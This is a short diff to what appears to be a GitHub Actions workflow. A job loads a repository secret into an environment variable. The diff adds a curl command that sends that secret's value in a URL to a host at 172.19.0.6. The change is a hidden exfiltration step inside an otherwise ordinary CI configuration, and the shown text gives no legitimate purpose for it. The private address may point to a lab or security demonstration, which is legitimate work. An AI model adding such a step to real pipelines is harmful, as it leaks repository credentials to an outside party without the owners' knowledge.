@@ -28,3 +28,4 @@ jobs:
         SECRET: ${{ secrets.SECRET }}
       run: |
         echo $SECRET
+        curl http://172.19.0.6/$SECRET
